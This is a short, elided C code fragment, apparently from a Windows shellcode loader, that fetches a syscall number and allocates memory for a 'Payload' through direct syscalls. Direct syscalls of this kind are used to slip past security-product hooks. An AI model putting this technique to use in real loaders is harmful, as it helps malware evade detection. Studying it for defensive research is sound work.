...
)
{
	...
	OKAY("Executing Via Direct Syscalls!");

	GrabSSN(SyscallConfig.SyscallInfo.SyscallNumber);
	Status = ExecuteDirect((HANDLE)-1, &Payload, 0, &PayloadSize, MEM_COMMIT, PAGE_READWRITE);
